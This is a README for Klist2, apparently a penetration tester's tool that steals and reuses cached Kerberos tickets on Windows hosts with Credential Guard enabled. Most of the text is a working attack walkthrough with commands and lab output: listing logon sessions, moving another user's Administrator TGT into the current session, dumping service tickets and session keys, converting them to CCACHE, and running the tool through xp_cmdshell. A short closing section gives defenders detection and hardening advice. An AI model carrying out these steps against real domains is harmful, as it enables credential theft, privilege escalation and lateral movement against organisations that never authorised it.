# Klist2
A tool for exploiting Kerberos tickets against system with Credential Guard enabled. 

**The tools in this Repo have been tested on multiple systems but I am not an active developer. I did my best to cover basis and implement proper error handling but mistakes could have been made. The purpose of this repo is more of a proof of concept for technique so use at your own risk**

This repository is a work in progress for abusing cached kerberos tickets when credential guard is enabled. With Credential Guard enabled (which it is by default on Windows server 2025 and newer) TGT session keys are protected even from Administrators or system limiting credential theft exposure. A common technique I utilize during penetration tests is to use the builtin klist.exe tool to extract TGT's that are cached on a target system which often results in relatively stealthy credential theft, privilege escalation and lateral movement. Technique is fairly simple. You can use klist sessions to enumerate logon sessions then dump TGT information using klist tgt -li <luid> command. 

PS C:\WINDOWS\system32> klist sessions

Current LogonId is 0:0x468c4f9
[0] Session 0 0:0x46931ff TEST\test Kerberos:Network
[1] Session 0 0:0x468c4f9 TEST\Administrator Kerberos:Interactive
[2] Session 0 0:0x467fecc TEST\test Kerberos:Network
[3] Session 0 0:0x46588c0 TEST\test NTLM:Network
[4] Session 2 0:0x14d465 TEST\Administrator Kerberos:RemoteInteractive
[5] Session 1 0:0x144c4 Window Manager\DWM-1 Negotiate:Interactive
[6] Session 0 0:0xe140 Font Driver Host\UMFD-0 Negotiate:Interactive
[7] Session 2 0:0x1488de Window Manager\DWM-2 Negotiate:Interactive
[8] Session 0 0:0x1ffd6 NT Service\MSSQLSERVER Negotiate:Service
[9] Session 1 0:0x14514 Window Manager\DWM-1 Negotiate:Interactive
[10] Session 0 0:0x3e7 TEST\SQL01$ Negotiate:(0)
[11] Session 0 0:0x20613 NT Service\SQLTELEMETRY Negotiate:Service
[12] Session 1 0:0xe15a Font Driver Host\UMFD-1 Negotiate:Interactive
[13] Session 0 0:0x3e4 TEST\SQL01$ Negotiate:Service
[14] Session 0 0:0xd8bb \ NTLM:(0)
[15] Session 0 0:0x4678089 TEST\test Kerberos:Network
[16] Session 0 0:0x464cb7d TEST\test Negotiate:Interactive
[17] Session 0 0:0x464cb51 TEST\test Kerberos:Interactive
[18] Session 0 0:0x452acc6 TEST\Administrator NTLM:Network
[19] Session 2 0:0x14890f Window Manager\DWM-2 Negotiate:Interactive
[20] Session 2 0:0x148696 Font Driver Host\UMFD-2 Negotiate:Interactive
[21] Session 0 0:0x3e5 NT AUTHORITY\LOCAL SERVICE Negotiate:Service

PS C:\Windows\Tasks> klist tgt
Ticket Count: 1

Cached TGT:

ServiceName        : krbtgt/TEST.LOCAL
TargetName         : krbtgt/TEST
FullServiceName    : Administrator
DomainName         : TEST.LOCAL
TargetDomainName   : TEST.LOCAL
AltTargetDomainName: TEST.LOCAL
TicketFlags        : (0x40e10000) forwardable renewable initial preauth
Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
                   : KeyLength 32 - 35 1D E3 98 01 79 B9 AD EB BB 3A 2A FB 15 7E 48 61 8E C2 DD AF 07 81 2B 1A C0 CF 06 72 5A 37 33
StartTime          : 9/2/2025 12:05:02
EndTime            : 9/2/2025 22:05:02
RenewUntil         : 9/9/2025 12:05:02
TimeSkew           : 0
EncodedTicket      : (size: 1226)


The resulting data can be taken offline and converted into CCACHE or KIRBI format to use with other tools or from another system. This is particularly effective for batch or service logons as TGT's can always be refreshed using stored credentials with no need to extract them or know the password of the target account.  Credential Guard can thwart this process by protecting TGT session keys making it significantly harder for this kind of credential theft to occur. You can tell that Credential Guard is enabled by the length of the session key. Notice in the above example our key length is 32 bytes. With Credential Guard you'll see a key length of ~171 bytes:

PS C:\WINDOWS\system32> klist tgt

Current LogonId is 0:0x468c4f9

Cached TGT:

ServiceName        : krbtgt
TargetName (SPN)   : krbtgt
ClientName         : Administrator
DomainName         : TEST.LOCAL
TargetDomainName   : TEST.LOCAL
AltTargetDomainName: TEST.LOCAL
Ticket Flags       : 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
                   : KeyLength 171 - 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

While Credential Guard makes things more challenging there are still methods to work around this. First off, Credential Guard protects against removing the TGT from the system, however, as long as the TGT remains on the system where it was originally cached it can be used freely. The klist2.exe tool in this repo is a modified version of Windows builtin klist.exe that makes use of this fact to move TGT's between caches. Using the output from "klist sessions" command we can identify sessions on the target host. We can then move any cached credentials using the modified klist tool with the command "klist2.exe move2 KRBTGT/TEST.LOCAL -li <luid of session we want a ticket from>". In the below example, I move the Administrator TGT cached in LUID  0x14d465 into our current session.

 PS C:\Users\test\Documents> klist

Current LogonId is 0:0x467fecc

Cached Tickets: (1)

#0>     Client: test @ TEST.LOCAL
        Server: host/sql01.test.local @ TEST.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 9/2/2025 11:51:58 (local)
        End Time:   9/2/2025 21:51:24 (local)
        Renew Time: 0
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x8 -> ASC
        Kdc Called:

 PS C:\windows\tasks> .\klist2.exe move2 KRBTGT/TEST.LOCAL -li 0x468c4f9
token is system
Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
                   : KeyLength 171 - AB 00 00 00 00 00 00 00 17 00 00 00 64 00 00 00 01 00 00 00 01 01 00 00 01 00 00 00 0B 37 53 F3 63 EE 69 BB 93 83 CC 50 E9 3B 47 13 23 64 41 C3 26 33 D0 DE A4 16 67 49 DF A5 FF 76 61 D5 E0 BE 32 47 6B 16 E2 7C 3F E4 F1 F6 C2 35 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 30 00 00 00 4B 65 72 62 65 72 6F 73 4B 65 79 57 69 74 68 4D 65 74 61 64 61 74 61 F3 F4 62 FA B5 CB BB F1 B3 D0 0A DA 75 6F 6D 09 C0 32 D4 6A 5F 13 7F 08 6B CC 08 A5 77 DD D4 CD E6 52 0B DB CE 05 F9 BF CF 33 0E 09 74 8B 7D 4E
 PS C:\windows\tasks> klist

Current LogonId is 0:0x467fecc

Cached Tickets: (1)

#0>     Client: Administrator @ TEST.LOCAL
        Server: krbtgt/TEST.LOCAL @ TEST.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 9/2/2025 11:56:03 (local)
        End Time:   9/2/2025 21:56:03 (local)
        Renew Time: 9/9/2025 11:56:03 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
 PS C:\windows\tasks> klist get host/dc01.test.local

Current LogonId is 0:0x467fecc
A ticket to host/dc01.test.local has been retrieved successfully.

Cached Tickets: (2)

#0>     Client: Administrator @ TEST.LOCAL
        Server: krbtgt/TEST.LOCAL @ TEST.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 9/2/2025 11:56:31 (local)
        End Time:   9/2/2025 21:56:31 (local)
        Renew Time: 9/9/2025 11:56:03 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC01.test.local

#1>     Client: Administrator @ TEST.LOCAL
        Server: host/dc01.test.local @ TEST.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 9/2/2025 11:56:31 (local)
        End Time:   9/2/2025 21:56:31 (local)
        Renew Time: 9/9/2025 11:56:03 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.test.local


This method works best if you are able to establish an interactive session on the remote host (RDP for example). Network based logins can still suffer from a double hop issue making command execution on remote hosts not work correctly, an issue im still working on building some tooling to work around. 

The second method comes from the fact that Credential Guard only protects TGT's it does not protect against service tickets and therefore service tickets can still be extracted from the system and re-used elsewhere. This can be done with the all parameter of klist2.exe (klist2.exe all -li <luid of session to dump>). The resulting output of the service ticket can be taken offline and converted to a CCACHE or KIRBI file. An example of how to do that is present in this repository in the klist-convertst.ps1 script which utilizes the Kerberos.NET library for conversion. The tool requires being run with Powershell 7.0 or higher and requires the Kerberos.net DLL's to be in the same directory as the script (or modifying the script code to import the DLL's from a different location). The script takes as input a text file containing all the details obtained from klist2.exe output (beginning with the line starting with ServiceName all the way down to the end of the hex dump output). Save that output to a text file and then convert with klist-convertst.ps1 -inputfile <path to text file> -outputfile <path where ccache should be placed including file name and extension i.e. klist-convertst.ps1 -inputfile c:\windows\tasks\Administrator.txt -outputfile c:\windows\tasks\Administrator.ccache. 


klist get LDAP/dc01.test.local -li  0x468c4f9

Current LogonId is 0:0x475955a
Targeted LogonId is 0:0x468c4f9
A ticket to LDAP/dc01.test.local has been retrieved successfully.

Cached Tickets: (3)

#0>     Client: Administrator @ TEST.LOCAL
        Server: krbtgt/TEST.LOCAL @ TEST.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 9/2/2025 12:31:59 (local)
        End Time:   9/2/2025 22:31:59 (local)
        Renew Time: 9/9/2025 11:56:03 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC01.test.local

#1>     Client: Administrator @ TEST.LOCAL
        Server: LDAP/dc01.test.local @ TEST.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 9/2/2025 12:31:59 (local)
        End Time:   9/2/2025 22:31:59 (local)
        Renew Time: 9/9/2025 11:56:03 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.test.local

#2>     Client: Administrator @ TEST.LOCAL
        Server: host/dc01.test.local @ TEST.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 9/2/2025 12:30:28 (local)
        End Time:   9/2/2025 22:30:28 (local)
        Renew Time: 9/9/2025 11:56:03 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.test.local


        C:\windows\tasks> .\klist2.exe all -li 0x468c4f9
        token is system
        Ticket Count: 3

        Cached TGT:

        ServiceName        : krbtgt/TEST.LOCAL
        TargetName         : krbtgt/TEST.LOCAL
        FullServiceName    : Administrator
        DomainName         : TEST.LOCAL
        TargetDomainName   : TEST.LOCAL
        AltTargetDomainName: TEST.LOCAL
        TicketFlags        : (0x40e10000) forwardable renewable initial preauth
        Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
                           : KeyLength 171 - AB 00 00 00 00 00 00 00 17 00 00 00 64 00 00 00 01 00 00 00 01 01 00 00 01 00 00 00 DC 75 C5 FD 7E 6E 6A C9 90 FE 95 CF 3F D6 F7 32 BF 62 CA 14 EF 36 0A 59 85 CB 7A 3E 7A DE 1D F3 09 09 1D 47 38 69 C8 64 EF 79 E5 8E EA 1E 25 E2 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 30 00 00 00 4B 65 72 62 65 72 6F 73 4B 65 79 57 69 74 68 4D 65 74 61 64 61 74 61 41 C4 26 0B 2F 44 57 2D 68 F5 09 06 4E 6B F2 9E CD 95 DC FE 36 59 7A 63 4C 80 0E DA D1 0D 91 7D C9 19 76 74 B8 C7 14 0B 1D 22 C3 17 F2 19 F0 CF
        StartTime          : 9/2/2025 12:31:59
        EndTime            : 9/2/2025 22:31:59
        RenewUntil         : 9/9/2025 11:56:03
        TimeSkew           : 0
        EncodedTicket      : (size: 1226)
        0000  61 82 04 c6 30 82 04 c2:a0 03 02 01 05 a1 0c 1b
        0010  0a 54 45 53 54 2e 4c 4f:43 41 4c a2 1f 30 1d a0
        0020  03 02 01 02 a1 16 30 14:1b 06 6b 72 62 74 67 74
        0030  1b 0a 54 45 53 54 2e 4c:4f 43 41 4c a3 82 04 8a
        0040  30 82 04 86 a0 03 02 01:12 a1 03 02 01 02 a2 82
        0050  04 78 04 82 04 74 b6 cf:b2 ec ac d3 7e 17 f3 5c
        0060  7f b2 7d e1 d0 47 4f b5:8c 09 60 53 da a1 16 0a
        0070  e3 86 4c f6 22 35 60 8d:97 6f 2b d4 da 7a 2f cc
        0080  0b f6 94 e2 2d 69 dc ba:4c 18 82 9a fb 7d 0d 53


        Cached TGT:

        ServiceName        : LDAP/dc01.test.local
        TargetName         : LDAP/dc01.test.local
        FullServiceName    : Administrator
        DomainName         : TEST.LOCAL
        TargetDomainName   : TEST.LOCAL
        AltTargetDomainName: TEST.LOCAL
        TicketFlags        : (0x40a50000) forwardable renewable preauth delegate
        Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
                           : KeyLength 32 - 0E 56 18 2C 6D FA 6C F6 E3 CD DD 42 5E 4E DB A4 57 B1 FC B0 65 04 D2 0D 6B F2 C7 47 92 8B 7D FE
        StartTime          : 9/2/2025 12:31:59
        EndTime            : 9/2/2025 22:31:59
        RenewUntil         : 9/9/2025 11:56:03
        TimeSkew           : 0
        EncodedTicket      : (size: 1367)
        0000  61 82 05 53 30 82 05 4f:a0 03 02 01 05 a1 0c 1b
        0010  0a 54 45 53 54 2e 4c 4f:43 41 4c a2 22 30 20 a0
        0020  03 02 01 02 a1 19 30 17:1b 04 4c 44 41 50 1b 0f
        0030  64 63 30 31 2e 74 65 73:74 2e 6c 6f 63 61 6c a3
        0040  82 05 14 30 82 05 10 a0:03 02 01 12 a1 03 02 01
        0050  07 a2 82 05 02 04 82 04:fe 01 df 09 12 d6 29 c2
        0060  d2 fc 37 72 72 41 b2 e7:e2 91 0e fb bb 2d 20 12
        0070  64 9a 58 63 a6 f9 5f 95:d0 76 09 87 57 11 87 2b
        0080  a3 4c f8 95 78 25 1f ac:cd fc 36 82 06 08 49 43
        0090  3a a9 bd 19 9b 1a 81 6e:ad db f4 6d fe b7 2e 8a
        00a0  35 76 6d 19 63 23 87 45:2a d6 ae c4 02 e4 92 81


        Cached TGT:

        ServiceName        : host/dc01.test.local
        TargetName         : host/dc01.test.local
        FullServiceName    : Administrator
        DomainName         : TEST.LOCAL
        TargetDomainName   : TEST.LOCAL
        AltTargetDomainName: TEST.LOCAL
        TicketFlags        : (0x40a50000) forwardable renewable preauth delegate
        Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
                           : KeyLength 32 - 53 04 54 26 BF FF 37 2F 34 80 88 9D F2 C5 91 17 EC 90 1A 7B 9E 23 51 2C 57 D2 D9 6F 90 D5 C8 A0
        StartTime          : 9/2/2025 12:30:28
        EndTime            : 9/2/2025 22:30:28
        RenewUntil         : 9/9/2025 11:56:03
        TimeSkew           : 0
        EncodedTicket      : (size: 1367)
        0000  61 82 05 53 30 82 05 4f:a0 03 02 01 05 a1 0c 1b
        0010  0a 54 45 53 54 2e 4c 4f:43 41 4c a2 22 30 20 a0
        0020  03 02 01 02 a1 19 30 17:1b 04 68 6f 73 74 1b 0f
        0030  64 63 30 31 2e 74 65 73:74 2e 6c 6f 63 61 6c a3
        0040  82 05 14 30 82 05 10 a0:03 02 01 12 a1 03 02 01
        0050  07 a2 82 05 02 04 82 04:fe ac 7b 2a 7c f7 1b 3c
        0060  7d 54 78 12 bc 79 55 21:73 c1 cb 56 fd 5a 40 da
        0070  dd 45 00 a4 e2 3b 03 71:f3 6a 34 d1 3c 65 56 b7
        0080  fe 95 d9 f1 2f 5a fe bf:3b ec f0 43 65 e4 0f 6c
        0090  40 8e 38 f5 b2 a5 80 a6:b0 23 fb 7b 8f 96 3d c9


As an interesting side note, while Administrator privilege is required to extract TGT session keys or to interact with another users kerberos cache, it is not required to access session keys for service tickets in your own cache. In theory this isn't really much of an advantage but can be used to simplify some attacks or work around controls if you want to utilize existing tools rather than building your own. In most cases this wont be useful for much, but can be handy if you compromise a service running as a virtual service account (for example, xp_cmdshell running under context of nt service\mssqlserver) since they use computer credentials over the network and therefore its kerberos cache will be populted with tickets for the computer account. This could allow extraction of service tickets which can be used by other tools for executing attacks like Shadow Credentials or requesting certificates when relaying isn't available. 

SQL (sa  dbo@master)> xp_cmdshell whoami
output                   
----------------------   
nt service\mssqlserver   

NULL                     

SQL (sa  dbo@master)> xp_cmdshell c:\windows\tasks\klist2.exe all
output                                                                             
--------------------------------------------------------------------------------   
ServiceName        : LDAP/DC01.test.local/test.local                               
TargetName         : LDAP/DC01.test.local/test.local                               
FullServiceName    : SQL01$                                                        
DomainName         : TEST.LOCAL                                                    
TargetDomainName   : TEST.LOCAL                                                    
AltTargetDomainName: TEST.LOCAL                                                    
TicketFlags        : (0x40a50000) forwardable renewable preauth delegate           
Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96                       
                   : KeyLength 32 - D1 E5 02 87 C9 91 B1 B5 19 BF 5E 75 99 34 9B 92 0C 0C 54 6F 76 D1 E9 D5 B7 1F DD 4A 72 A0 48 01    
StartTime          : 9/2/2025 11:29:50                                             
EndTime            : 9/2/2025 21:29:50                                             
RenewUntil         : 9/9/2025 11:29:50                                             
TimeSkew           : -1                                                            
EncodedTicket      : (size: 1244)                                                  
0000  61 82 04 d8 30 82 04 d4:a0 03 02 01 05 a1 0c 1b                              
0010  0a 54 45 53 54 2e 4c 4f:43 41 4c a2 2e 30 2c a0                              
0020  03 02 01 02 a1 25 30 23:1b 04 4c 44 41 50 1b 0f                              
0030  44 43 30 31 2e 74 65 73:74 2e 6c 6f 63 61 6c 1b                              
0040  0a 74 65 73 74 2e 6c 6f:63 61 6c a3 82 04 8d 30                              
0050  82 04 89 a0 03 02 01 12:a1 03 02 01 07 a2 82 04                              
0060  7b 04 82 04 77 a4 be a3:90 d3 39 09 e4 3b 64 24   


**Guidance for Defenders**
Credential Guard like any security tool or feature is just one layer of defense and should not be relied upon to "save" you from credential theft. Implementing tiering in Active Directory, strong network access controls to limit attack surface and principle of least privilege are still your best defenses against these types of attacks. Once a malicious actor has Administrator rights on a production server there is only so much that your tools and configurations can do to help you as there are just too many avenues available to privileged users to work around limitations enforced on the system. RestrictedAdmin mode for RDP for privileged users can be utilized to help prevent caching of TGT's on remote systems but that is still being tested and researched (I should also point out that many multi-factor implementations can be bypassed with RestrictedAdmin mode so that is a bit of a double edge sword as well if multi-factor is a control you rely on internally). Behavioral based monitoring can go a long way in detecting these types of attacks, especially looking for unusual logins to systems (a service account using RDP for example is an immediate red flag and indicator of compromise). If your endpoint protection tools support it, configure them to generate alerts when a Kerberos ticket identity and LUID identity do not match (for example if the LUID is for test and the kerberos ticket is for Administrator then this can be treated as an indicator of compromise that should be acted on). 

Feel free to reach out with comments or suggestions. 

